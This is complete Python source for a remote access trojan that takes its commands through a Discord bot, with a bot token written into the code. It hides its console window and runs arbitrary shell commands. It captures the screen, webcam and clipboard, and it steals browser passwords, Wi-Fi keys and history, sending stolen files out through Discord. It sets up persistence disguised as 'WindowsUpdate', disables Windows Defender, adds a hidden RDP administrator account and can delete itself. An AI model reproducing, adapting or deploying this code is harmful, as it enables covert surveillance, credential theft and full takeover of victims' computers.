import os
import sys
import subprocess
import time
import json
import base64
import threading
import socket
import platform
import psutil
import winreg
import ctypes
import shutil
import random
import string
from datetime import datetime
from PIL import ImageGrab
import mss
import discord
from discord.ext import commands
import asyncio
import io
import webbrowser
import glob

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import pynput.keyboard as keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    PYCAW_AVAILABLE = True
except ImportError:
    PYCAW_AVAILABLE = False

try:
    import win32com.client
    WIN32COM_AVAILABLE = True
except ImportError:
    WIN32COM_AVAILABLE = False

try:
    import wmi
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

try:
    import winsound
    WINSOUND_AVAILABLE = True
except ImportError:
    WINSOUND_AVAILABLE = False

if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

DISCORD_TOKEN = "MTUyOTQzNzA2NjI4OTYxNDk2OQ.GIE9lm.qOqi4bjaf2EmaRU3QMcmNDCfe9j87kSpxiwwhg"
COMMAND_PREFIX = "!"
CATEGORY_NAME = "RAT Clients"

keylog_buffer = []
keylog_active = False
streaming = False
streaming_thread = None
control_channel = None
processed_messages = set()

class RATClient(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        intents.guilds = True
        super().__init__(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)
        self.current_dir = os.getcwd()
        self.client_id = self.get_client_id()
        self.registered = False
        self.my_channel = None

    def get_client_id(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return f"{hostname}_{ip.replace('.', '_')}"

    async def on_ready(self):
        global control_channel
        print(f"✅ RAT connected as {self.user}")
        print(f"🖥️  Hostname: {socket.gethostname()}")
        print(f"🌐 IP: {socket.gethostbyname(socket.gethostname())}")
        print(f"📡 Client ID: {self.client_id}")
        
        await self.setup_client_channel()
        self.loop.create_task(self.heartbeat())
        self.registered = True

    async def setup_client_channel(self):
        global control_channel
        
        channel_name = self.client_id.lower().replace('_', '-')[:30]
        
        for guild in self.guilds:
            category = None
            for cat in guild.categories:
                if cat.name == CATEGORY_NAME:
                    category = cat
                    break
            
            if not category:
                try:
                    category = await guild.create_category(CATEGORY_NAME)
                    print(f"📁 Created category: {CATEGORY_NAME}")
                except Exception as e:
                    print(f"⚠️  Could not create category: {e}")
            
            for channel in guild.text_channels:
                if channel.name == channel_name and channel.category == category:
                    self.my_channel = channel
                    control_channel = channel
                    print(f"📡 Using existing channel: #{channel.name}")
                    await self.send_connection_alert()
                    return
            
            try:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(
                        read_messages=True,
                        send_messages=True
                    ),
                    guild.me: discord.PermissionOverwrite(
                        read_messages=True,
                        send_messages=True,
                        manage_messages=True
                    )
                }
                channel = await guild.create_text_channel(
                    channel_name,
                    category=category,
                    overwrites=overwrites,
                    topic=f"🖥️ Client: {socket.gethostname()} | IP: {socket.gethostbyname(socket.gethostname())} | ID: {self.client_id}"
                )
                self.my_channel = channel
                control_channel = channel
                print(f"📡 Created new channel: #{channel.name}")
                await self.send_connection_alert()
                return
            except Exception as e:
                print(f"⚠️  Could not create channel: {e}")
                for channel in guild.text_channels:
                    if channel.category == category:
                        self.my_channel = channel
                        control_channel = channel
                        await self.send_connection_alert()
                        return

    async def send_connection_alert(self):
        if not self.my_channel:
            print("⚠️  No channel available!")
            return
        
        info = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": platform.platform(),
            "username": os.getlogin(),
            "cpu": platform.processor(),
            "ram": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "disk": f"{psutil.disk_usage('/').total / (1024**3):.2f} GB",
        }
        
        embed = discord.Embed(
            title="🟢 New RAT Client Connected!",
            color=discord.Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Client ID", value=self.client_id, inline=True)
        embed.add_field(name="Hostname", value=info.get('hostname', 'Unknown'), inline=True)
        embed.add_field(name="IP Address", value=info.get('ip', 'Unknown'), inline=True)
        embed.add_field(name="OS", value=info.get('os', 'Unknown'), inline=True)
        embed.add_field(name="Username", value=info.get('username', 'Unknown'), inline=True)
        embed.add_field(name="RAM", value=info.get('ram', 'Unknown'), inline=True)
        embed.add_field(name="Disk", value=info.get('disk', 'Unknown'), inline=True)
        embed.set_footer(text=f"Client ID: {self.client_id}")
        
        await self.my_channel.send(embed=embed)
        await self.my_channel.send(f"✅ **Client {self.client_id} is ready!**")
        print("✅ Connection alert sent!")

    async def heartbeat(self):
        while True:
            await asyncio.sleep(60)
            if self.my_channel:
                try:
                    await self.my_channel.send(f"HEARTBEAT:{self.client_id}")
                except:
                    pass

    async def on_message(self, message):
        global processed_messages
        
        if not self.my_channel or message.channel.id != self.my_channel.id:
            return
        
        if message.id in processed_messages:
            return
        processed_messages.add(message.id)

        content = message.content
        
        if not content.startswith("CMD:"):
            return

        try:
            cmd_parts = content.split(":", 2)
            if len(cmd_parts) < 3:
                return
            
            target_id = cmd_parts[1]
            command = cmd_parts[2]
            
            if target_id != self.client_id and target_id != "all":
                return

            print(f"⚡ Executing: {command}")
            result = await self.execute_command(command)
            
            if result:
                if len(str(result)) > 1900:
                    for i in range(0, len(str(result)), 1900):
                        chunk = str(result)[i:i+1900]
                        await message.channel.send(f"RESULT:{self.client_id}:{chunk}")
                else:
                    await message.channel.send(f"RESULT:{self.client_id}:{result}")
            else:
                await message.channel.send(f"RESULT:{self.client_id}:Command executed (no output)")

        except Exception as e:
            print(f"❌ Error: {e}")
            await message.channel.send(f"ERROR:{self.client_id}:{str(e)}")

    async def execute_command(self, command):
        global streaming
        parts = command.strip().split()
        cmd = parts[0].lower() if parts else ""
        
        if cmd == "pwd":
            return self.current_dir
        
        elif cmd == "cd":
            if len(parts) > 1:
                try:
                    os.chdir(parts[1])
                    self.current_dir = os.getcwd()
                    return f"Changed to: {self.current_dir}"
                except Exception as e:
                    return f"Error: {e}"
            else:
                return "Usage: cd <directory>"
        
        elif cmd == "ls":
            try:
                files = os.listdir()
                result = []
                for f in files:
                    path = os.path.join(self.current_dir, f)
                    if os.path.isdir(path):
                        result.append(f"{f}/")
                    else:
                        size = os.path.getsize(path)
                        result.append(f"{f} ({size} bytes)")
                return "\n".join(result) if result else "Empty directory"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "mkdir":
            if len(parts) < 2:
                return "Usage: mkdir <directory>"
            try:
                os.makedirs(parts[1], exist_ok=True)
                return f"Created: {parts[1]}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "delete":
            if len(parts) < 2:
                return "Usage: delete <path>"
            try:
                path = parts[1]
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                return f"Deleted: {path}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "rename":
            if len(parts) < 3:
                return "Usage: rename <old> <new>"
            try:
                os.rename(parts[1], parts[2])
                return f"Renamed: {parts[1]} -> {parts[2]}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "copy":
            if len(parts) < 3:
                return "Usage: copy <source> <destination>"
            try:
                shutil.copy2(parts[1], parts[2])
                return f"Copied: {parts[1]} -> {parts[2]}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "move":
            if len(parts) < 3:
                return "Usage: move <source> <destination>"
            try:
                shutil.move(parts[1], parts[2])
                return f"Moved: {parts[1]} -> {parts[2]}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "download":
            if len(parts) < 2:
                return "Usage: download <remote_path>"
            try:
                if not os.path.exists(parts[1]):
                    return f"File not found: {parts[1]}"
                with open(parts[1], 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                filename = os.path.basename(parts[1])
                chunk_size = 1900
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    await self.my_channel.send(f"FILECHUNK:{self.client_id}:{filename}:{i}:{chunk}")
                return f"File downloaded: {parts[1]}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "info":
            try:
                info = {
                    "hostname": socket.gethostname(),
                    "ip": socket.gethostbyname(socket.gethostname()),
                    "os": platform.platform(),
                    "username": os.getlogin(),
                    "cpu": platform.processor(),
                    "ram": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
                    "disk": f"{psutil.disk_usage('/').total / (1024**3):.2f} GB",
                    "processes": len(list(psutil.process_iter()))
                }
                return json.dumps(info, indent=2)
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "shell":
            if len(parts) > 1:
                try:
                    result = subprocess.check_output(" ".join(parts[1:]), shell=True, stderr=subprocess.STDOUT, timeout=30)
                    return result.decode('utf-8', errors='ignore')[:1900]
                except subprocess.TimeoutExpired:
                    return "Command timed out"
                except Exception as e:
                    return f"Error: {e}"
            else:
                return "Usage: shell <command>"
        
        elif cmd == "ps":
            try:
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                    try:
                        info = proc.info
                        if info['name']:
                            processes.append(f"{info['pid']}: {info['name']} (CPU: {info['cpu_percent']:.1f}%, MEM: {info['memory_percent']:.1f}%)")
                    except:
                        pass
                return "\n".join(processes[:50])
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "kill":
            if len(parts) < 2:
                return "Usage: kill <pid>"
            try:
                pid = int(parts[1])
                proc = psutil.Process(pid)
                proc.kill()
                return f"Killed process: {pid}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "ping":
            return "pong"
        
        elif cmd == "uptime":
            try:
                boot_time = psutil.boot_time()
                uptime = time.time() - boot_time
                days = uptime // 86400
                hours = (uptime % 86400) // 3600
                minutes = (uptime % 3600) // 60
                return f"Uptime: {int(days)}d {int(hours)}h {int(minutes)}m"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "hostname":
            return socket.gethostname()
        
        elif cmd == "ip":
            return socket.gethostbyname(socket.gethostname())
        
        elif cmd == "whoami":
            return os.getlogin()
        
        elif cmd == "persist":
            return self.add_persistence()
        
        elif cmd == "screenshot":
            try:
                img = ImageGrab.grab(all_screens=True)
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=50)
                buf.seek(0)
                file = discord.File(buf, filename=f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
                await self.my_channel.send(file=file)
                return "✅ Screenshot captured and sent!"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "webcam":
            if not CV2_AVAILABLE:
                return "Webcam not available (OpenCV not installed)"
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    file = discord.File(io.BytesIO(buf.tobytes()), filename=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
                    await self.my_channel.send(file=file)
                    cap.release()
                    return "✅ Webcam captured and sent!"
                cap.release()
                return "Failed to capture webcam"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "keylogs":
            logs = "".join(keylog_buffer)
            keylog_buffer.clear()
            return logs if logs else "No keylogs captured"
        
        elif cmd == "clipboard":
            try:
                if sys.platform == "win32":
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    return str(data)
                else:
                    return "Clipboard access only available on Windows"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "passwords":
            return self.steal_passwords()
        
        elif cmd == "wifi":
            return self.steal_wifi()
        
        elif cmd == "history":
            return self.steal_history()
        
        elif cmd == "netstat":
            try:
                result = subprocess.check_output("netstat -an", shell=True, timeout=10)
                return result.decode('utf-8', errors='ignore')[:1900]
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "arp":
            try:
                result = subprocess.check_output("arp -a", shell=True, timeout=10)
                return result.decode('utf-8', errors='ignore')[:1900]
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "nslookup":
            if len(parts) < 2:
                return "Usage: nslookup <domain>"
            try:
                result = subprocess.check_output(f"nslookup {parts[1]}", shell=True, timeout=10)
                return result.decode('utf-8', errors='ignore')[:1900]
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "pinghost":
            if len(parts) < 2:
                return "Usage: pinghost <host>"
            try:
                if sys.platform == "win32":
                    result = subprocess.check_output(f"ping -n 4 {parts[1]}", shell=True, timeout=10)
                else:
                    result = subprocess.check_output(f"ping -c 4 {parts[1]}", shell=True, timeout=10)
                return result.decode('utf-8', errors='ignore')[:1900]
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "beep":
            try:
                if sys.platform == "win32" and WINSOUND_AVAILABLE:
                    import winsound
                    winsound.Beep(1000, 500)
                    return "🔔 Beep!"
                else:
                    return "Beep only available on Windows with winsound"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "volume":
            if len(parts) < 2:
                return "Usage: volume <0-100>"
            try:
                level = int(parts[1])
                level = max(0, min(100, level))
                
                if sys.platform == "win32":
                    try:
                        if PYCAW_AVAILABLE:
                            devices = AudioUtilities.GetSpeakers()
                            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                            volume = cast(interface, POINTER(IAudioEndpointVolume))
                            volume.SetMasterVolumeLevelScalar(level / 100, None)
                            return f"🔊 Volume set to {level}%"
                    except:
                        pass
                    
                    try:
                        subprocess.run(f'nircmd.exe setsysvolume {level * 655}', shell=True, capture_output=True, timeout=2)
                        return f"🔊 Volume set to {level}% (using nircmd)"
                    except:
                        pass
                    
                    return f"⚠️ Volume set attempted. Install pycaw: pip install pycaw comtypes"
                else:
                    subprocess.run(["pactl", "set-sink-volume", "0", f"{level}%"], capture_output=True, timeout=5)
                    return f"🔊 Volume set to {level}%"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "screenbrightness":
            if len(parts) < 2:
                return "Usage: screenbrightness <0-100>"
            try:
                level = int(parts[1])
                level = max(0, min(100, level))
                
                if sys.platform == "win32":
                    try:
                        if WMI_AVAILABLE:
                            import wmi
                            c = wmi.WMI(namespace='wmi')
                            methods = c.WmiMonitorBrightnessMethods()[0]
                            methods.WmiSetBrightness(level, 0)
                            return f"💡 Brightness set to {level}%"
                    except:
                        pass
                    
                    return f"⚠️ Brightness set attempted. Install wmi: pip install wmi"
                else:
                    try:
                        max_brightness_path = glob.glob('/sys/class/backlight/*/max_brightness')
                        if max_brightness_path:
                            with open(max_brightness_path[0], 'r') as f:
                                max_brightness = int(f.read())
                            brightness_path = glob.glob('/sys/class/backlight/*/brightness')
                            if brightness_path:
                                with open(brightness_path[0], 'w') as f:
                                    f.write(str(int(level * max_brightness / 100)))
                                return f"💡 Brightness set to {level}%"
                    except:
                        pass
                    return "Could not set brightness"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "openurl":
            if len(parts) < 2:
                return "Usage: openurl <url>"
            try:
                url = parts[1]
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                webbrowser.open(url)
                return f"🌐 Opened URL: {url}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "wallpaper":
            if len(parts) < 2:
                return "Usage: wallpaper <image_path>"
            try:
                if not os.path.exists(parts[1]):
                    return f"File not found: {parts[1]}"
                    
                if sys.platform == "win32":
                    if parts[1].lower().endswith(('.jpg', '.jpeg', '.png')):
                        from PIL import Image
                        img = Image.open(parts[1])
                        bmp_path = os.path.join(tempfile.gettempdir(), 'wallpaper.bmp')
                        img.save(bmp_path, 'BMP')
                        ctypes.windll.user32.SystemParametersInfoW(20, 0, bmp_path, 0)
                        os.remove(bmp_path)
                    else:
                        ctypes.windll.user32.SystemParametersInfoW(20, 0, parts[1], 0)
                    return f"🖼️ Wallpaper changed to: {parts[1]}"
                else:
                    subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{parts[1]}"], capture_output=True, timeout=5)
                    return f"🖼️ Wallpaper changed to: {parts[1]}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "speak":
            if len(parts) < 2:
                return "Usage: speak <text>"
            try:
                text = " ".join(parts[1:])
                if sys.platform == "win32":
                    try:
                        import win32com.client
                        speaker = win32com.client.Dispatch("SAPI.SpVoice")
                        speaker.Speak(text)
                        return f"🔊 Speaking: {text}"
                    except:
                        subprocess.run(f'powershell -command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak(\'{text}\')"', shell=True)
                        return f"🔊 Speaking: {text} (using PowerShell)"
                else:
                    subprocess.run(["espeak", text], shell=True, capture_output=True, timeout=10)
                    return f"🔊 Speaking: {text}"
            except Exception as e:
                return f"Error: {e}"
        
        elif cmd == "restart":
            os.system("shutdown /r /t 5" if sys.platform == "win32" else "shutdown -r +5")
            return "System will restart in 5 seconds"
        
        elif cmd == "shutdown":
            os.system("shutdown /s /t 5" if sys.platform == "win32" else "shutdown -h +5")
            return "System will shutdown in 5 seconds"
        
        elif cmd == "logout":
            os.system("shutdown /l" if sys.platform == "win32" else "gnome-session-quit --no-prompt")
            return "Logged out"
        
        elif cmd == "lock":
            if sys.platform == "win32":
                ctypes.windll.user32.LockWorkStation()
            else:
                subprocess.run(["gnome-screensaver-command", "-l"])
            return "Workstation locked"
        
        elif cmd == "sleep":
            if sys.platform == "win32":
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            else:
                os.system("systemctl suspend")
            return "System going to sleep"
        
        elif cmd == "hibernate":
            if sys.platform == "win32":
                os.system("shutdown /h")
            return "System hibernating"
        
        elif cmd == "rdp":
            return self.enable_rdp()
        
        elif cmd == "disabledefender":
            return self.disable_defender()
        
        elif cmd == "enabledefender":
            return self.enable_defender()
        
        elif cmd == "adddefenderexclusion":
            return self.add_defender_exclusion()
        
        elif cmd == "selfdestruct":
            return self.self_destruct()
        
        elif cmd == "help":
            return self.get_help()
        
        else:
            return f"Unknown command: {cmd}"

    def get_help(self):
        help_text = """
📡 RAT Commands

📁 File Management:
pwd, ls, cd, mkdir, delete, rename, copy, move, download

🖥️ System:
info, shell, ps, kill, ping, uptime, hostname, ip, whoami, persist

📷 Capture:
screenshot, webcam, keylogs, clipboard

🔑 Stealer:
passwords, wifi, history

🌐 Network:
netstat, arp, nslookup, pinghost

🎮 Fun:
beep, volume, screenbrightness, openurl, wallpaper, speak

🖥️ System Control:
rdp, lock, restart, shutdown, logout, sleep, hibernate

🛡️ Defender:
disabledefender, enabledefender, adddefenderexclusion

💀 Dangerous:
selfdestruct
"""
        return help_text

    def add_persistence(self):
        try:
            if sys.platform == "win32":
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
                winreg.CloseKey(handle)
                
                subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{sys.executable} {__file__}" /sc onlogon /f', shell=True, capture_output=True)
                
                startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
                shutil.copy(__file__, startup)
                
                return "Persistence added (Registry, Scheduled Task, Startup)"
            else:
                with open('/etc/cron.d/update', 'w') as f:
                    f.write(f"@reboot {sys.executable} {__file__}\n")
                return "Persistence added (cron)"
        except Exception as e:
            return f"Error adding persistence: {e}"

    def disable_defender(self):
        try:
            if sys.platform == "win32":
                subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f", shell=True, creationflags=0x08000000)
                subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealTimeMonitoring /t REG_DWORD /d 1 /f", shell=True, creationflags=0x08000000)
                subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f", shell=True, creationflags=0x08000000)
                return "Windows Defender disabled"
            return "Defender commands only available on Windows"
        except Exception as e:
            return f"Error: {e}"

    def enable_defender(self):
        try:
            if sys.platform == "win32":
                subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 0 /f", shell=True, creationflags=0x08000000)
                subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealTimeMonitoring /t REG_DWORD /d 0 /f", shell=True, creationflags=0x08000000)
                return "Windows Defender enabled"
            return "Defender commands only available on Windows"
        except Exception as e:
            return f"Error: {e}"

    def add_defender_exclusion(self):
        try:
            if sys.platform == "win32":
                exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
                current_dir = os.getcwd()
                subprocess.run(f'powershell -command "Add-MpPreference -ExclusionPath \'{exe_path}\'"', shell=True, creationflags=0x08000000)
                subprocess.run(f'powershell -command "Add-MpPreference -ExclusionPath \'{current_dir}\'"', shell=True, creationflags=0x08000000)
                subprocess.run(f'powershell -command "Add-MpPreference -ExclusionProcess \'{os.path.basename(exe_path)}\'"', shell=True, creationflags=0x08000000)
                return "Defender exclusion added"
            return "Defender commands only available on Windows"
        except Exception as e:
            return f"Error: {e}"

    def enable_rdp(self):
        try:
            if sys.platform == "win32":
                subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', shell=True, creationflags=0x08000000)
                subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f', shell=True, creationflags=0x08000000)
                subprocess.run('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes', shell=True, creationflags=0x08000000)
                
                username = "rdp_" + ''.join(random.choices(string.ascii_lowercase, k=4))
                password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=14))
                subprocess.run(f'net user {username} {password} /add', shell=True, creationflags=0x08000000)
                subprocess.run(f'net localgroup administrators {username} /add', shell=True, creationflags=0x08000000)
                subprocess.run(f'net localgroup "Remote Desktop Users" {username} /add', shell=True, creationflags=0x08000000)
                
                local_ip = socket.gethostbyname(socket.gethostname())
                return f"RDP Enabled!\nIP: {local_ip}\nUser: {username}\nPass: {password}"
            return "RDP only available on Windows"
        except Exception as e:
            return f"Error: {e}"

    def steal_passwords(self):
        try:
            passwords = []
            if sys.platform == "win32":
                try:
                    import sqlite3
                    import win32crypt
                    appdata = os.getenv('LOCALAPPDATA')
                    browsers = {
                        'Chrome': os.path.join(appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
                        'Edge': os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
                        'Brave': os.path.join(appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
                    }
                    for browser_name, chrome_path in browsers.items():
                        if os.path.exists(chrome_path):
                            conn = sqlite3.connect(chrome_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                try:
                                    password = win32crypt.CryptUnprotectData(row[2])[1].decode()
                                    passwords.append(f"[{browser_name}] URL: {row[0]}, User: {row[1]}, Pass: {password}")
                                except:
                                    pass
                            conn.close()
                except:
                    pass
            return "\n".join(passwords[:50]) if passwords else "No passwords found"
        except Exception as e:
            return f"Error: {e}"

    def steal_wifi(self):
        try:
            if sys.platform == "win32":
                result = subprocess.check_output("netsh wlan show profiles", shell=True)
                profiles = result.decode('utf-8', errors='ignore')
                wifi_passwords = []
                for line in profiles.split('\n'):
                    if "All User Profile" in line:
                        profile = line.split(':')[1].strip()
                        if profile:
                            try:
                                result = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True)
                                data = result.decode('utf-8', errors='ignore')
                                for line2 in data.split('\n'):
                                    if "Key Content" in line2:
                                        password = line2.split(':')[1].strip()
                                        wifi_passwords.append(f"{profile}: {password}")
                            except:
                                wifi_passwords.append(f"{profile}: Error retrieving password")
                return "\n".join(wifi_passwords) if wifi_passwords else "No WiFi passwords found"
            return "WiFi stealing only available on Windows"
        except Exception as e:
            return f"Error: {e}"

    def steal_history(self):
        try:
            if sys.platform == "win32":
                history_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
                if os.path.exists(history_path):
                    import sqlite3
                    conn = sqlite3.connect(history_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 20")
                    history = [f"URL: {row[0]}" for row in cursor.fetchall()]
                    conn.close()
                    return "\n".join(history) if history else "No history found"
            return "History extraction only available on Windows with Chrome"
        except Exception as e:
            return f"Error: {e}"

    def self_destruct(self):
        try:
            if sys.platform == "win32":
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(handle, "WindowsUpdate")
                    winreg.CloseKey(handle)
                except:
                    pass
                
                subprocess.run("schtasks /delete /tn \"WindowsUpdate\" /f", shell=True, capture_output=True)
                
                startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_file = os.path.join(startup, os.path.basename(__file__))
                if os.path.exists(startup_file):
                    os.remove(startup_file)
                
                batch_content = f'''@echo off
timeout /t 2 /nobreak > nul
del "{__file__}"
del "%~f0"'''
                with open("cleanup.bat", "w") as f:
                    f.write(batch_content)
                subprocess.Popen("cleanup.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                os.remove(__file__)
            return "Self-destruct initiated"
        except Exception as e:
            return f"Error: {e}"

    def run(self):
        try:
            super().run(DISCORD_TOKEN)
        except discord.LoginFailure:
            print("❌ Invalid Discord token!")
            sys.exit(1)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    client = RATClient()
    client.run()
